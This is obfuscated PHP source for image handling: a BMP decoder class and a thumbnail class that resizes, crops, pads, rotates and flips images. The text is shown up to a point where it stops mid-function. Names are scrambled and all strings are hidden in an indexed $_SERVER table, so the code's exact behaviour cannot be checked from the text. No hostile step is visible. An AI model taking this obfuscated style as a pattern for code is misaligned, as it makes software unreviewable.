<?php
 goto CÖˆˆºä¢; cà¤â×°: class ImageGdBMP { public static function load($E”ášÓÔ®) { $E¨®«†Œº = fopen($E”ášÓÔ®, $_SERVER[¿õñ][1429]); if ($E¨®«†Œº === !1) { return !1; } $Dâ·Æ¨™õ‚ = self::loadFromStream($E¨®«†Œº); fclose($E¨®«†Œº); return $Dâ·Æ¨™õ‚; } public static function loadFromStream($C½å‰ê¾´å) { $e„•—¼ãô´ =& $_SERVER[¿õñ]; $AÈÂËáŒ²È = fread($C½å‰ê¾´å, 14); if ($AÈÂËáŒ²È === !1) { return !1; } if ($AÈÂËáŒ²È[0] != $e„•—¼ãô´[1739] || $AÈÂËáŒ²È[1] != $e„•—¼ãô´[1740]) { return !1; } $A…‚Ü×­Î£ = unpack($e„•—¼ãô´[1741] . $e„•—¼ãô´[1742] . $e„•—¼ãô´[1743] . $e„•—¼ãô´[1744] . $e„•—¼ãô´[1745], $AÈÂËáŒ²È); return self::loadFromStreamAndFileHeader($C½å‰ê¾´å, $A…‚Ü×­Î£); } public static function loadFromStreamAndFileHeader($AĞ“¶à”Œ, array $F›¨Ì£) { goto a¶†êä…Ò; BÅÄ’‰Ü¤‚: if ($c›Ò¤¥°ˆº == 1 || $c›Ò¤¥°ˆº == 4 || $c›Ò¤¥°ˆº == 8) { goto EÖĞœä¬¸; Bä¥¸¦¦“ç: $AŸ¦±¾éé¬ = (1 << $c›Ò¤¥°ˆº) - 1 << $CÔ¾‰ÜÙá; if ($A±¼¸Á›ç == 1 || $A±¼¸Á›ç == 2) { $dÌÙ°†Ë§ = 0; $f†Ïğ©¤â = $c›Ò¤¥°ˆº >> 2 & 1; for (;;) { if ($dÌÙ°†Ë§ < -1 || $dÌÙ°†Ë§ > $b¯ÇçÎİì || $f«™ËŸµ < -1 || $f«™ËŸµ > $F¼å×‘‚†) { imagedestroy($aÚ‹ŠÂàã‰); return !1; } $FÈÛ´’ = fread($AĞ“¶à”Œ, 1); if ($FÈÛ´’ === !1) { imagedestroy($aÚ‹ŠÂàã‰); return !1; } switch ($FÈÛ´’) { case $Aë×œ »‚[1764]: $FÈÛ´’ = fread($AĞ“¶à”Œ, 1); if ($FÈÛ´’ === !1) { imagedestroy($aÚ‹ŠÂàã‰); return !1; } switch ($FÈÛ´’) { case $Aë×œ »‚[1764]: $f«™ËŸµ += $b¯±ì“— ; $dÌÙ°†Ë§ = 0; break; case $Aë×œ »‚[1766]: $f«™ËŸµ = 0; $dÌÙ°†Ë§ = 0; break 3; case $Aë×œ »‚[1767]: $FÈÛ´’ = fread($AĞ“¶à”Œ, 2); if ($FÈÛ´’ === !1) { imagedestroy($aÚ‹ŠÂàã‰); return !1; } list(, $dø°–‰°, $c·Ï×çíÇ·) = unpack($Aë×œ »‚[1768], $FÈÛ´’); $dÌÙ°†Ë§ += $dø°–‰°; $f«™ËŸµ += $c·Ï×çíÇ· * $b¯±ì“— ; break; default: list(, $DĞ™¥„»¯‡) = unpack($Aë×œ »‚[1769], $FÈÛ´’); $cŒÑâ²Ûò = ($DĞ™¥„»¯‡ >> $f†Ïğ©¤â) + ($DĞ™¥„»¯‡ & $f†Ïğ©¤â); $FÈÛ´’ = fread($AĞ“¶à”Œ, $cŒÑâ²Ûò + 1 & ~1); if ($FÈÛ´’ === !1) { imagedestroy($aÚ‹ŠÂàã‰); return !1; } for ($b»æŸ„¢¡Æ = 0, $fˆ«­ãõÆÜ = 0; $b»æŸ„¢¡Æ < $DĞ™¥„»¯‡; ++$b»æŸ„¢¡Æ, ++$dÌÙ°†Ë§, $fˆ«­ãõÆÜ += $c›Ò¤¥°ˆº) { list(, $cÓ¯ƒ‘÷õ) = unpack($Aë×œ »‚[1769], $FÈÛ´’[$fˆ«­ãõÆÜ >> 3]); $eˆ¼šÃïßĞ = $fˆ«­ãõÆÜ & 7; imagesetpixel($aÚ‹ŠÂàã‰, $dÌÙ°†Ë§, $f«™ËŸµ, $c¢“Ãõ÷Î¸[($cÓ¯ƒ‘÷õ & $AŸ¦±¾éé¬ >> $eˆ¼šÃïßĞ) >> $CÔ¾‰ÜÙá - $eˆ¼šÃïßĞ]); } break; } break; default: $C×†§ÓÛåë = fread($AĞ“¶à”Œ, 1); if ($C×†§ÓÛåë === !1) { imagedestroy($aÚ‹ŠÂàã‰); return !1; } list(, $Fœ‚È’“ìì, $cÓ¯ƒ‘÷õ) = unpack($Aë×œ »‚[1768], $FÈÛ´’ . $C×†§ÓÛåë); for ($b»æŸ„¢¡Æ = 0, $fˆ«­ãõÆÜ = 0; $b»æŸ„¢¡Æ < $Fœ‚È’“ìì; ++$b»æŸ„¢¡Æ, ++$dÌÙ°†Ë§, $fˆ«­ãõÆÜ += $c›Ò¤¥°ˆº) { $eˆ¼šÃïßĞ = $fˆ«­ãõÆÜ & 7; imagesetpixel($aÚ‹ŠÂàã‰, $dÌÙ°†Ë§, $f«™ËŸµ, $c¢“Ãõ÷Î¸[($cÓ¯ƒ‘÷õ & $AŸ¦±¾éé¬ >> $eˆ¼šÃïßĞ) >> $CÔ¾‰ÜÙá - $eˆ¼šÃïßĞ]); } break; } } } else { for ($dîÁèÇÜ•µ = 0; $dîÁèÇÜ•µ < $aïÈÛ¦®Ì; ++$dîÁèÇÜ•µ, $f«™ËŸµ += $b¯±ì“— ) { $FÈÛ´’ = fread($AĞ“¶à”Œ, $CªŒ¬»¹äÀ); if ($FÈÛ´’ === !1) { imagedestroy($aÚ‹ŠÂàã‰); return !1; } $fˆ«­ãõÆÜ = 0; for ($dÌÙ°†Ë§ = 0; $dÌÙ°†Ë§ < $b¯ÇçÎİì; ++$dÌÙ°†Ë§, $fˆ«­ãõÆÜ += $c›Ò¤¥°ˆº) { list(, $cÓ¯ƒ‘÷õ) = unpack($Aë×œ »‚[1769], $FÈÛ´’[$fˆ«­ãõÆÜ >> 3]); $eˆ¼šÃïßĞ = $fˆ«­ãõÆÜ & 7; imagesetpixel($aÚ‹ŠÂàã‰, $dÌÙ°†Ë§, $f«™ËŸµ, $c¢“Ãõ÷Î¸[($cÓ¯ƒ‘÷õ & $AŸ¦±¾éé¬ >> $eˆ¼šÃïßĞ) >> $CÔ¾‰ÜÙá - $eˆ¼šÃïßĞ]); } } } goto ešÕÔ­Ò°; c”à‹‚§”: $c¢“Ãõ÷Î¸ = array(); for ($b»æŸ„¢¡Æ = 0; $b»æŸ„¢¡Æ < $a†ÏŠ¢¥¼Õ; ++$b»æŸ„¢¡Æ) { $FÈÛ´’ = fread($AĞ“¶à”Œ, $Cë¢§Ùˆ‡È); if ($FÈÛ´’ === !1) { imagedestroy($aÚ‹ŠÂàã‰); return !1; } extract(unpack($Aë×œ »‚[1765], $FÈÛ´’ . $Aë×œ »‚[1764])); $c¢“Ãõ÷Î¸[] = imagecolorallocate($aÚ‹ŠÂàã‰, $FñÈ£®‘‡Ë, $f‚©ŸÎ–ğÅ, $eˆ¼šÃïßĞ); } $CÔ¾‰ÜÙá = 8 - $c›Ò¤¥°ˆº; goto Bä¥¸¦¦“ç; EÖĞœä¬¸: $aÚ‹ŠÂàã‰ = imagecreate($b¯ÇçÎİì, $aïÈÛ¦®Ì); $Cë¢§Ùˆ‡È = $F›¯èªİ–ê == 12 ? 3 : 4; $a†ÏŠ¢¥¼Õ = $CÖÎË‚¡õˆ ? $CÖÎË‚¡õˆ : pow(2, $c›Ò¤¥°ˆº); goto c”à‹‚§”; ešÕÔ­Ò°: } else { goto fËæ›ˆ‰Õ; E©äÄÕ¿áå: $E¨’Êê½Ó„ = $C¼¶¼ÍØ²Ï ? 1 / $C¼¶¼ÍØ²Ï : 1; $DİŒóï¸Å = $eíÂš™ÔÃ£ ? 1 / $eíÂš™ÔÃ£ : 1; $a‘†½É²‹Í = $F©™Ø„Ççë ? 1 / $F©™Ø„Ççë : 1; goto dÄºÇÌ¿æÊ; fËæ›ˆ‰Õ: $aÚ‹ŠÂàã‰ = imagecreatetruecolor($b¯ÇçÎİì, $aïÈÛ¦®Ì); imagealphablending($aÚ‹ŠÂàã‰, !1); if ($aô«¯È×”µ) { imagesavealpha($aÚ‹ŠÂàã‰, !0); } goto eÒòãïğ–¤; eÒòãïğ–¤: $b³¥å¾Ñ = $c›Ò¤¥°ˆº >> 3; $dª´¢ÅšÕˆ = $aô«¯È×”µ ? 127 : 0; $A øğãŠá = $aô«¯È×”µ ? 1 / $aô«¯È×”µ : 1; goto E©äÄÕ¿áå; dÄºÇÌ¿æÊ: for ($dîÁèÇÜ•µ = 0; $dîÁèÇÜ•µ < $aïÈÛ¦®Ì; ++$dîÁèÇÜ•µ, $f«™ËŸµ += $b¯±ì“— ) { $FÈÛ´’ = fread($AĞ“¶à”Œ, $CªŒ¬»¹äÀ); if ($FÈÛ´’ === !1) { imagedestroy($aÚ‹ŠÂàã‰); return !1; } $fˆ«­ãõÆÜ = 0; for ($dÌÙ°†Ë§ = 0; $dÌÙ°†Ë§ < $b¯ÇçÎİì; ++$dÌÙ°†Ë§, $fˆ«­ãõÆÜ += $b³¥å¾Ñ) { list(, $cÓ¯ƒ‘÷õ) = unpack($Aë×œ »‚[1746], substr($FÈÛ´’, $fˆ«­ãõÆÜ, $b³¥å¾Ñ) . $Aë×œ »‚[1770]); $C…åÅÂ“Ú˜ = $cÓ¯ƒ‘÷õ & $aô«¯È×”µ; $D÷¢Şºé = $cÓ¯ƒ‘÷õ & $C¼¶¼ÍØ²Ï; $dâò„‘â = $cÓ¯ƒ‘÷õ & $eíÂš™ÔÃ£; $c‰ËÅšà = $cÓ¯ƒ‘÷õ & $F©™Ø„Ççë; $bÆá¨Ï¬ù = $dª´¢ÅšÕˆ - (($C…åÅÂ“Ú˜ << 7) - $C…åÅÂ“Ú˜) * $A øğãŠá; $FñÈ£®‘‡Ë = (($D÷¢Şºé << 8) - $D÷¢Şºé) * $E¨’Êê½Ó„; $f‚©ŸÎ–ğÅ = (($dâò„‘â << 8) - $dâò„‘â) * $DİŒóï¸Å; $eˆ¼šÃïßĞ = (($c‰ËÅšà << 8) - $c‰ËÅšà) * $a‘†½É²‹Í; imagesetpixel($aÚ‹ŠÂàã‰, $dÌÙ°†Ë§, $f«™ËŸµ, $bÆá¨Ï¬ù << 24 | $FñÈ£®‘‡Ë << 16 | $f‚©ŸÎ–ğÅ << 8 | $eˆ¼šÃïßĞ); } } imagealphablending($aÚ‹ŠÂàã‰, !0); goto DèÆ¿™„Œ; DèÆ¿™„Œ: } return $aÚ‹ŠÂàã‰; goto E”Ìì¢Ï„Ù; EŞöíé¡î: if ($b¯ÇçÎİì == 0 || $F¼å×‘‚† == 0 || $CĞïô óƒô != 1 || ($aô«¯È×”µ & $C¼¶¼ÍØ²Ï) != 0 || ($aô«¯È×”µ & $eíÂš™ÔÃ£) != 0 || ($aô«¯È×”µ & $F©™Ø„Ççë) != 0 || ($C¼¶¼ÍØ²Ï & $eíÂš™ÔÃ£) != 0 || ($C¼¶¼ÍØ²Ï & $F©™Ø„Ççë) != 0 || ($eíÂš™ÔÃ£ & $F©™Ø„Ççë) != 0) { return !1; } if ($A±¼¸Á›ç == 4 || $A±¼¸Á›ç == 5) { $FÈÛ´’ = stream_get_contents($AĞ“¶à”Œ, $F²®—Ñ¾Ä«); if ($FÈÛ´’ === !1) { return !1; } return imagecreatefromstring($FÈÛ´’); } $CªŒ¬»¹äÀ = $b¯ÇçÎİì * $c›Ò¤¥°ˆº + 31 >> 3 & ~3; goto B¢šÅ„‰˜; a¶†êä…Ò: $Aë×œ »‚ =& $_SERVER[¿õñ]; if ($F›¨Ì£[$Aë×œ »‚[385]] != 19778) { return !1; } $FÈÛ´’ = fread($AĞ“¶à”Œ, 4); goto F¹ÖÎßÒ„Ê; B¢šÅ„‰˜: $aïÈÛ¦®Ì = abs($F¼å×‘‚†); $f«™ËŸµ = $F¼å×‘‚† > 0 ? $aïÈÛ¦®Ì - 1 : 0; $b¯±ì“—  = $F¼å×‘‚† > 0 ? -1 : 1; goto BÅÄ’‰Ü¤‚; F¹ÖÎßÒ„Ê: if ($FÈÛ´’ === !1) { return !1; } list(, $F›¯èªİ–ê) = unpack($Aë×œ »‚[1746], $FÈÛ´’); if ($F›¯èªİ–ê == 12) { goto F—‡å“¯øÍ; F—‡å“¯øÍ: $FÈÛ´’ = fread($AĞ“¶à”Œ, $F›¯èªİ–ê - 4); if ($FÈÛ´’ === !1) { return !1; } extract(unpack($Aë×œ »‚[1747] . $Aë×œ »‚[1748] . $Aë×œ »‚[1749] . $Aë×œ »‚[1750], $FÈÛ´’)); goto FÍáÇ‹ó—; FÍáÇ‹ó—: $CÖÎË‚¡õˆ = $D¤É¹¢ÙÖŒ = $aô«¯È×”µ = $A±¼¸Á›ç = 0; $C¼¶¼ÍØ²Ï = 16711680; $eíÂš™ÔÃ£ = 65280; goto fíïÜ¢‡Û’; fíïÜ¢‡Û’: $F©™Ø„Ççë = 255; goto aæÄ©ñ…µ; aæÄ©ñ…µ: } else { if (124 < $F›¯èªİ–ê || $F›¯èªİ–ê < 40) { return !1; } else { goto E©ò¼Ûóí; E©ò¼Ûóí: $FÈÛ´’ = fread($AĞ“¶à”Œ, 36); if ($FÈÛ´’ === !1) { return !1; } extract(unpack($Aë×œ »‚[1751] . $Aë×œ »‚[1752] . $Aë×œ »‚[1749] . $Aë×œ »‚[1753] . $Aë×œ »‚[1754] . $Aë×œ »‚[1755] . $Aë×œ »‚[1756] . $Aë×œ »‚[1757] . $Aë×œ »‚[1758] . $Aë×œ »‚[1759], $FÈÛ´’)); goto B¨ãŒãœ¤; aİ³õÇ˜Ø†: if ($E–¯ÒŠˆ·± & 2147483648) { $E–¯ÒŠˆ·± = -(~$E–¯ÒŠˆ·± & 4294967295) - 1; } if ($F›¨Ì£[$Aë×œ »‚[513]] != 0) { $Dø÷Ù ¸‰‚ = $c›Ò¤¥°ˆº == 1 || $c›Ò¤¥°ˆº == 4 || $c›Ò¤¥°ˆº == 8 ? ($CÖÎË‚¡õˆ ? $CÖÎË‚¡õˆ : pow(2, $c›Ò¤¥°ˆº)) << 2 : 0; $D¥Ó±„ç„´ = $F²®—Ñ¾Ä« ? $F²®—Ñ¾Ä« : ($b¯ÇçÎİì * $c›Ò¤¥°ˆº + 31 >> 3 & ~3) * abs($F¼å×‘‚†); $EÀà¹¨²á = $F›¨Ì£[$Aë×œ »‚[513]] - $D¥Ó±„ç„´ - $Dø÷Ù ¸‰‚ - 14; if ($F›¯èªİ–ê < $EÀà¹¨²á && 40 <= $F›¯èªİ–ê && $F›¯èªİ–ê <= 124) { $F›¯èªİ–ê = $EÀà¹¨²á; } } if ($F›¯èªİ–ê - 40 > 0) { $FÈÛ´’ = fread($AĞ“¶à”Œ, $F›¯èªİ–ê - 40); if ($FÈÛ´’ === !1) { return !1; } extract(unpack($Aë×œ »‚[1760] . $Aë×œ »‚[1761] . $Aë×œ »‚[1762] . $Aë×œ »‚[1763], $FÈÛ´’ . str_repeat($Aë×œ »‚[1764], 120))); } else { $aô«¯È×”µ = $C¼¶¼ÍØ²Ï = $eíÂš™ÔÃ£ = $F©™Ø„Ççë = 0; } goto c»ÁÎ¨äæƒ; c»ÁÎ¨äæƒ: if (($c›Ò¤¥°ˆº == 16 || $c›Ò¤¥°ˆº == 24 || $c›Ò¤¥°ˆº == 32) && $A±¼¸Á›ç == 0 && $C¼¶¼ÍØ²Ï == 0 && $eíÂš™ÔÃ£ == 0 && $F©™Ø„Ççë == 0) { switch ($c›Ò¤¥°ˆº) { case 16: $C¼¶¼ÍØ²Ï = 31744; $eíÂš™ÔÃ£ = 992; $F©™Ø„Ççë = 31; break; case 24: case 32: $C¼¶¼ÍØ²Ï = 16711680; $eíÂš™ÔÃ£ = 65280; $F©™Ø„Ççë = 255; break; } } goto FôÚ›ƒªí­; B¨ãŒãœ¤: if ($b¯ÇçÎİì & 2147483648) { $b¯ÇçÎİì = -(~$b¯ÇçÎİì & 4294967295) - 1; } if ($F¼å×‘‚† & 2147483648) { $F¼å×‘‚† = -(~$F¼å×‘‚† & 4294967295) - 1; } if ($bµÎèÎ¨¯ & 2147483648) { $bµÎèÎ¨¯ = -(~$bµÎèÎ¨¯ & 4294967295) - 1; } goto aİ³õÇ˜Ø†; FôÚ›ƒªí­: } } goto EŞöíé¡î; E”Ìì¢Ï„Ù: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($f•¾–Ç‚», $aÉ¯¨‰’Ã¹) { goto aèÎ¥˜¦ ; aèÎ¥˜¦ : $this->srcFile = $f•¾–Ç‚»; $this->echoType = $aÉ¯¨‰’Ã¹; $this->im = self::image($f•¾–Ç‚»); goto eˆ±–’âëñ; F›éŠÇÍ‹Ğ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto f¿áŸÆã›”; eˆ±–’âëñ: if (!$this->im) { return !1; } $f“²âæé¦­ = $_SERVER[¿õñ][33]; $this->imgData = GetImageSize($f•¾–Ç‚», $f“²âæé¦­); goto F›éŠÇÍ‹Ğ; f¿áŸÆã›”: } public static function image($b‡Ò”Â¯) { $aíìßš‘Ä =& $_SERVER[¿õñ]; $bïî–ã»§ = $aíìßš‘Ä[33]; $eô”Ì¬±Ëé = GetImageSize($b‡Ò”Â¯, $bïî–ã»§); $C«çùô©“ç = !1; switch ($eô”Ì¬±Ëé[2]) { case IMAGETYPE_GIF: if (!function_exists($aíìßš‘Ä[1771])) { break; } $C«çùô©“ç = imagecreatefromgif($b‡Ò”Â¯); break; case IMAGETYPE_JPEG: if (!function_exists($aíìßš‘Ä[1772])) { break; } $C«çùô©“ç = imagecreatefromjpeg($b‡Ò”Â¯); break; case IMAGETYPE_PNG: if (!function_exists($aíìßš‘Ä[1773])) { break; } $C«çùô©“ç = @imagecreatefrompng($b‡Ò”Â¯); imagesavealpha($C«çùô©“ç, !0); break; case IMAGETYPE_XBM: $C«çùô©“ç = imagecreatefromxbm($b‡Ò”Â¯); break; case IMAGETYPE_WBMP: $C«çùô©“ç = imagecreatefromwbmp($b‡Ò”Â¯); break; case IMAGETYPE_BMP: $C«çùô©“ç = imagecreatefrombmp($b‡Ò”Â¯); break; default: break; } return $C«çùô©“ç; } public static function imageSize($F“è‰¹“Ê¸) { $CÖ¥“¤†Ş =& $_SERVER[¿õñ]; $BâÊô”Á†ƒ = GetImageSize($F“è‰¹“Ê¸); if (!$BâÊô”Á†ƒ) { return !1; } return array($CÖ¥“¤†Ş[1774] => $BâÊô”Á†ƒ[0], $CÖ¥“¤†Ş[1775] => $BâÊô”Á†ƒ[1]); } function distortion($DŠ¡øæ¯, $d…‰¥†àßà, $f¶‘Ò‚—È‡) { $B²Í¶Ø‡ºÛ = $this->creatImage($this->im, $d…‰¥†àßà, $f¶‘Ò‚—È‡, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($B²Í¶Ø‡ºÛ, $DŠ¡øæ¯); } function prorate($cÛ§²”ñßœ, $E£Á“˜í›, $aÎ…«È©) { $b•‰Œ¨ÌÃ® = $E£Á“˜í› / $aÎ…«È©; $B·˜§½§ëÌ = $this->srcW / $this->srcH; if ($b•‰Œ¨ÌÃ® <= $B·˜§½§ëÌ) { $B³¨»Î²½š = $E£Á“˜í›; $d‹Ëä¾Î = $B³¨»Î²½š * ($this->srcH / $this->srcW); } else { $d‹Ëä¾Î = $aÎ…«È©; $B³¨»Î²½š = $d‹Ëä¾Î * ($this->srcW / $this->srcH); } if ($this->srcW > $E£Á“˜í› || $this->srcH > $aÎ…«È©) { $c¯â³“à’é = $this->creatImage($this->im, $B³¨»Î²½š, $d‹Ëä¾Î, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($c¯â³“à’é, $cÛ§²”ñßœ); } else { $c¯â³“à’é = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($c¯â³“à’é, $cÛ§²”ñßœ); } } function cut($eÅ”¨‹ä„°, $Eƒ¢¸ëÓˆ, $C¬À“Šˆïğ) { goto FØİÏ¨á•; D¡Ò·¿±”: return $this->echoImage($aÕ¼èÏ‰Íâ, $eÅ”¨‹ä„°); goto DİÌ”ôÜéØ; E‡ÕÂÆæ²õ: $EöÎ«§Óíè = $this->creatImage($this->im, $Eé¤¯èÖí, $fÕ•˜ñóÂ, 0, 0, 0, 0, $this->srcW, $this->srcH); $aÕ¼èÏ‰Íâ = $this->creatImage($EöÎ«§Óíè, $Eƒ¢¸ëÓˆ, $C¬À“Šˆïğ, 0, 0, ($Eé¤¯èÖí - $Eƒ¢¸ëÓˆ) / 2, ($fÕ•˜ñóÂ - $C¬À“Šˆïğ) / 2, $Eƒ¢¸ëÓˆ, $C¬À“Šˆïğ); imageDestroy($EöÎ«§Óíè); goto D¡Ò·¿±”; FØİÏ¨á•: $d˜ÍÏ×Øº = $Eƒ¢¸ëÓˆ / $C¬À“Šˆïğ; $bå„šİë– = $this->srcW / $this->srcH; if ($d˜ÍÏ×Øº <= $bå„šİë–) { $fÕ•˜ñóÂ = $C¬À“Šˆïğ; $Eé¤¯èÖí = $fÕ•˜ñóÂ * ($this->srcW / $this->srcH); } else { $Eé¤¯èÖí = $Eƒ¢¸ëÓˆ; $fÕ•˜ñóÂ = $Eé¤¯èÖí * ($this->srcH / $this->srcW); } goto E‡ÕÂÆæ²õ; DİÌ”ôÜéØ: } function backFill($A•Ç‚ ‚¯¥, $eá²´Ÿ¢, $F°Ëˆ´´ƒ, $B¨ˆ‹×‡ªù = false, $f–®ñóÌÉÁ = 255, $F‡îæÚÔ­³ = 255, $FßÛòŸòÆ = 255) { goto C–¶Å“Ş ¹; DàªÖÕ¸ö£: return $this->echoImage($eÑõë¬Û¢, $A•Ç‚ ‚¯¥); goto d‰›•ï”‡™; C–¶Å“Ş ¹: $BÄ…ª°×±¶ = $eá²´Ÿ¢ / $F°Ëˆ´´ƒ; $b¯Èšİ‡… = $this->srcW / $this->srcH; if ($BÄ…ª°×±¶ <= $b¯Èšİ‡…) { $bßåÕ¤‰Šç = $eá²´Ÿ¢; $e—®Œ–ù‹ì = $bßåÕ¤‰Šç * ($this->srcH / $this->srcW); } else { $e—®Œ–ù‹ì = $F°Ëˆ´´ƒ; $bßåÕ¤‰Šç = $e—®Œ–ù‹ì * ($this->srcW / $this->srcH); } goto Bî‰¹­…éÆ; Bî‰¹­…éÆ: if (function_exists($_SERVER[¿õñ][1776])) { @($eÑõë¬Û¢ = imageCreateTrueColor($eá²´Ÿ¢, $F°Ëˆ´´ƒ)); if (!$eÑõë¬Û¢) { $eÑõë¬Û¢ = imageCreate($eá²´Ÿ¢, $F°Ëˆ´´ƒ); } } else { $eÑõë¬Û¢ = imageCreate($eá²´Ÿ¢, $F°Ëˆ´´ƒ); } $B‡†ââÏ³ = ($F°Ëˆ´´ƒ - $e—®Œ–ù‹ì) / 2; $bäà¿â¸„¾ = imagecolorallocate($eÑõë¬Û¢, $f–®ñóÌÉÁ, $F‡îæÚÔ­³, $FßÛòŸòÆ); goto fæ›§ÆÛÍ; fæ›§ÆÛÍ: if ($B¨ˆ‹×‡ªù) { $bäà¿â¸„¾ = imageColorTransparent($eÑõë¬Û¢, $bäà¿â¸„¾); $B‡†ââÏ³ = $F°Ëˆ´´ƒ - $e—®Œ–ù‹ì; } imageFilledRectangle($eÑõë¬Û¢, 0, 0, $eá²´Ÿ¢, $F°Ëˆ´´ƒ, $bäà¿â¸„¾); if ($this->srcW > $eá²´Ÿ¢ || $this->srcH > $F°Ëˆ´´ƒ) { $d—¯äºÖĞã = $this->creatImage($this->im, $bßåÕ¤‰Šç, $e—®Œ–ù‹ì, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($bßåÕ¤‰Šç < $eá²´Ÿ¢) { imageCopy($eÑõë¬Û¢, $d—¯äºÖĞã, ($eá²´Ÿ¢ - $bßåÕ¤‰Šç) / 2, 0, 0, 0, $bßåÕ¤‰Šç, $e—®Œ–ù‹ì); } else { if ($e—®Œ–ù‹ì < $F°Ëˆ´´ƒ) { imageCopy($eÑõë¬Û¢, $d—¯äºÖĞã, 0, $B‡†ââÏ³, 0, 0, $bßåÕ¤‰Šç, $e—®Œ–ù‹ì); } else { imageCopy($eÑõë¬Û¢, $d—¯äºÖĞã, 0, 0, 0, 0, $bßåÕ¤‰Šç, $e—®Œ–ù‹ì); } } } else { imageCopyMerge($eÑõë¬Û¢, $this->im, ($eá²´Ÿ¢ - $bßåÕ¤‰Šç) / 2, $B‡†ââÏ³, 0, 0, $bßåÕ¤‰Šç, $e—®Œ–ù‹ì, 100); } goto DàªÖÕ¸ö£; d‰›•ï”‡™: } function creatImage($bÇãÏ·ğ›”, $d¥ŠÊÚ°“¡, $eŒ„ùŒÁ©, $DÖÌ¹ÁÁ, $CŒÙòÁ¶˜Ç, $Aª¹”æï‹„, $C§ëôÈŞÏ¹, $AÏ„ñ¾•ÓÄ, $A»ïˆ„¢à) { if (function_exists($_SERVER[¿õñ][1776])) { @($dÇô¹¢º³ = ImageCreateTrueColor($d¥ŠÊÚ°“¡, $eŒ„ùŒÁ©)); @imagealphablending($dÇô¹¢º³, !1); @imagesavealpha($dÇô¹¢º³, !0); if ($dÇô¹¢º³) { imageCopyResampled($dÇô¹¢º³, $bÇãÏ·ğ›”, $DÖÌ¹ÁÁ, $CŒÙòÁ¶˜Ç, $Aª¹”æï‹„, $C§ëôÈŞÏ¹, $d¥ŠÊÚ°“¡, $eŒ„ùŒÁ©, $AÏ„ñ¾•ÓÄ, $A»ïˆ„¢à); } else { $dÇô¹¢º³ = ImageCreate($d¥ŠÊÚ°“¡, $eŒ„ùŒÁ©); imageCopyResized($dÇô¹¢º³, $bÇãÏ·ğ›”, $DÖÌ¹ÁÁ, $CŒÙòÁ¶˜Ç, $Aª¹”æï‹„, $C§ëôÈŞÏ¹, $d¥ŠÊÚ°“¡, $eŒ„ùŒÁ©, $AÏ„ñ¾•ÓÄ, $A»ïˆ„¢à); } } else { $dÇô¹¢º³ = ImageCreate($d¥ŠÊÚ°“¡, $eŒ„ùŒÁ©); imageCopyResized($dÇô¹¢º³, $bÇãÏ·ğ›”, $DÖÌ¹ÁÁ, $CŒÙòÁ¶˜Ç, $Aª¹”æï‹„, $C§ëôÈŞÏ¹, $d¥ŠÊÚ°“¡, $eŒ„ùŒÁ©, $AÏ„ñ¾•ÓÄ, $A»ïˆ„¢à); } return $dÇô¹¢º³; } public function imgRotate($Eö‰²·¹ÚË, $EÉß‹“—İš) { goto aîƒªøßò—; aîƒªøßò—: if (!$this->im || $EÉß‹“—İš % 360 === 0 || !function_exists($_SERVER[¿õñ][1777])) { return !1; } $cËº‹Ü¯ˆ = imageRotate($this->im, 360 - $EÉß‹“—İš, 0); $D¥µí¼ĞÛá = !1; goto C¡Â•å†ÃŞ; c‘îÏ§˜·½: return $D¥µí¼ĞÛá; goto CÖéˆ—±ˆ; C¡Â•å†ÃŞ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $D¥µí¼ĞÛá = imagegif($cËº‹Ü¯ˆ, $Eö‰²·¹ÚË); break; case IMAGETYPE_JPEG: $D¥µí¼ĞÛá = imagejpeg($cËº‹Ü¯ˆ, $Eö‰²·¹ÚË, 100); break; case IMAGETYPE_PNG: $D¥µí¼ĞÛá = imagePNG($cËº‹Ü¯ˆ, $Eö‰²·¹ÚË); break; default: break; } imageDestroy($cËº‹Ü¯ˆ); imageDestroy($this->im); goto c‘îÏ§˜·½; CÖéˆ—±ˆ: } function echoImage($B¤¥Ù÷´‘, $Bé×¬ù°å) { goto Eˆâ‚´·œ‘; CĞ™Î¯æ•Ñ: imageDestroy($this->im); return $bÛ§§ÜÅ‡; goto A¤¹öã°ÀŠ; E…ò¥‰ƒˆ: $bÛ§§ÜÅ‡ = !1; switch ($this->echoType) { case $a¸‰©Ê¿¡İ[1778]: $bÛ§§ÜÅ‡ = imagePNG($B¤¥Ù÷´‘); break; case $a¸‰©Ê¿¡İ[164]: $bÛ§§ÜÅ‡ = imagePNG($B¤¥Ù÷´‘, $Bé×¬ù°å); break; } imageDestroy($B¤¥Ù÷´‘); goto CĞ™Î¯æ•Ñ; Eˆâ‚´·œ‘: $a¸‰©Ê¿¡İ =& $_SERVER[¿õñ]; if (!$B¤¥Ù÷´‘) { return !1; } ob_get_clean(); goto E…ò¥‰ƒˆ; A¤¹öã°ÀŠ: } } if (!function_exists($_SERVER[¿õñ][1779])) { define($_SERVER[¿õñ][1780], 0); define($_SERVER[¿õñ][1781], 1); define($_SERVER[¿õñ][1782], 2); function imageflip($D‡‘îàˆê, $DÛ§÷ŠÆÄ) { switch ($DÛ§÷ŠÆÄ) { case IMG_FLIP_HORIZONTAL: $c›¨ŞĞËõ… = imagesx($D‡‘îàˆê) - 1; $F‹·”˜ïåº = $c›¨ŞĞËõ… / 2; $Fæ³ôÎ…İŠ = imagesy($D‡‘îàˆê); $eŒ­õäÒÉ¼ = imageistruecolor($D‡‘îàˆê) ? imagecreatetruecolor(1, $Fæ³ôÎ…İŠ) : imagecreate(1, $Fæ³ôÎ…İŠ); for ($CõïÙ·ÂÒ = 0; $CõïÙ·ÂÒ < $F‹·”˜ïåº; ++$CõïÙ·ÂÒ) { imagecopy($eŒ­õäÒÉ¼, $D‡‘îàˆê, 0, 0, $CõïÙ·ÂÒ, 0, 1, $Fæ³ôÎ…İŠ); imagecopy($D‡‘îàˆê, $D‡‘îàˆê, $CõïÙ·ÂÒ, 0, $c›¨ŞĞËõ… - $CõïÙ·ÂÒ, 0, 1, $Fæ³ôÎ…İŠ); imagecopy($D‡‘îàˆê, $eŒ­õäÒÉ¼, $c›¨ŞĞËõ… - $CõïÙ·ÂÒ, 0, 0, 0, 1, $Fæ³ôÎ…İŠ); } 